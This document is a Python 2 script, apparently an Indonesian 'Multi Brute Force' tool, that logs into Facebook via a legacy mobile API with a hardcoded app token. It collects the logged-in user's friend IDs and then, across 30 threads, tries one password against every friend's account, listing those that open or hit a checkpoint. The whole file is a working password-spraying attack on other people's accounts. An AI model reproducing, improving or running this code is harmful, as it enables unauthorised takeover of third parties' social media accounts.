import os 
import sys
import time
import json
import urllib
import threading
import requests

d = "\033[90;1m"
m = "\033[91;1m"
h = "\033[92;1m"
k = "\033[93;1m"
b = "\033[94;1m"
p = "\033[95;1m"
a = "\033[96;1m"
pu = "\033[97;1m"

count = 0
dados = []
gagal = []
oradadi = []
threads = []
id_konco = []

def ival(nob):
    color = {'d':90, 'm':91, 'h':92, 'k':93, 'b':94, 'p':95, 'a':96, 'w':97}
    for iv in color:
        nob = nob.replace('\r%s'%iv, '\033[%s;1m'%color[iv])
    nob += '\033[0m'
    nob = nob.replace('\r0', '\033[0m')
    print nob

def run(noob):
    for i in noob + '\n':
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(10. / 1000)

def clear():
    os.system("clear")

def banner():
    clear()
    ival ('''\ra
                    .-.-..
                   /+/++//
                  /+/++//
          *   *  /+/++//
           \ /  |/___//
         {X}v{X}| MBF|>>>>>>>>>>+.
          \rh [']  /'|'\             \\
          \rk     /  \  \             '
               \_  \_ \_ 
    
     \rw+==============================+
     \ra|       MULTI BRUTE FORCE      |
     \rw+==============================+
           \rwThanks to \raIvana Raa/
           \rwCreated by \raIqbal Dev
        \rd==========================''')

    

def login():
    
    try:
        token = open("token.txt", "r")
        mbf()
        
    except IOError, KeyError:
        
        banner()
        user_name = raw_input(p+"  [log]" + a + " Username" + k + ": ")
        password = raw_input(p+"  [log]" + a + " Password" + k + ": ")
        req = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+user_name+'&locale=en_US&password='+password+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
    
        dev = req.content
        jsl = json.loads(dev)
        if "session_key" in dev:
            print
            run (h+" Berhasil Login"+ pu +".........")
            open("token.txt", "w").write(jsl["access_token"])
            run (h+" Login Sukses" +pu+".........")
            print
            id_teman()
        elif "error_msg" in dev:
            print 
            print k+" Akun Kena Cekpoint.." 
            print
            sys.exit()

        else:
            print
            print m+ " Gagal Login..."
            print
            sys.exit()

def id_teman():
    try:
        token = open("token.txt", "r").read()
    except IOError:
        print m+ " Tidak ada token..."
        os.system('rm -f token.txt')

    else:
        try:
            req = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)
            jsl = json.loads(req.text)
            simpan_id = open("id.txt", "w")
            for ival in jsl['data']:
                id_konco.append(ival['id'])
                simpan_id.write(ival['id'] + "\n")
                data_id = open("id.txt", 'r').read().split()
                sys.stdout.write("\r \033[95m [$]\033[92m Mengambil ID Teman \033[97m=> " + str(len(data_id)))
                sys.stdout.flush()
            simpan_id.close()
            print
            print a+"\n  ID Tersimpan " + p + "(" + pu + "id.txt" + p + ")" 
            print 
            print (h+" [ "+p+"Lanjutkan Bos.."+h+" ]\n")
            raw_input(k+ " => ")
            
        except IOError:
            print m+" Terjadi kesalahan..."


def mbf():

    global password
    global listID

    try:
        token = open("token.txt", "r")
    except IOError:
        print
        print m+" Token Tidak Ada"
        os.system("rm -f token.txt")
        login()
    else:
    
        print
        banner()
        password = raw_input(h+"  [" +k+ "MBF" +h+ "]" + a + " Masukkan Password" + p + ": ")
        print
        try:
            listID = open(file_id, "r")
            for ival in range(30):
                iqbal = threading.Thread(target=mbfcrack, args=())
                iqbal.start()
                threads.append(iqbal)

            for ipal in threads:
                ipal.join()

        except IOError:
            print
            print m+" Tidak Ada File Yang Ditemukan.."


def mbfcrack():
    
    global count, dados, gagal, oradadi, baris
    
    try:
        data_lis = open('id.txt', "r")
        baris = data_lis.read().split()
        while listID:
            user = listID.readline().strip()
            url = "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + password + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
            Iq_data = urllib.urlopen(url)
            jsl = json.load(Iq_data)
            if count == len(baris):
                break
            if "access_token" in jsl:
                dados.append(h+" [OK] " + pu + user + " | " + a + password)
                count += 1
                
           
            elif "www.facebook.com" in jsl["error_msg"]:
                gagal.append(m+" [CP] " + d + user + " | " + m + password)
                count += 1
            else:
                oradadi.append(user)
                count += 1
        
            sys.stdout.write(pu+ "\r [$]" + a + " Crack " + p + str(len(baris)) + pu + " / " + p + str(count) + m + " [ " + h + str(len(dados)) + pu + " / " + k + str(len(gagal)) + m + " ]")
            sys.stdout.flush()
        

    except IOError:
        print
        print m+" Gangguan koneksi.."

       
def sel():
    print 
    print 
    for ipal in dados:
        print ipal
    for ival in gagal:
        print ival
    print

    print m+ " Bosok => " + str(len(oradadi))
    print
    

def pilih():
    try:
        lagi = raw_input(h+" [?]" +pu+ " Cracking Lagi?" +a+ " [y/n]: " +k+ "")
        if lagi == "y" or lagi == "yes" or lagi == "lagi":
            main()
            
        elif lagi == "n" or lagi == "no" or lagi == "tidak":
            sys.exit()
            
        else:
            print 
            print m+" Pilih Yg bener Cuk..."
            pilih()
    except KeyboardInterrupt:
        print
        print w+ " Keluar Dari Program.."
        sys.exit()
        
def main():
    login()
    mbf()
    sel()
    
if __name__=="__main__":
    main()
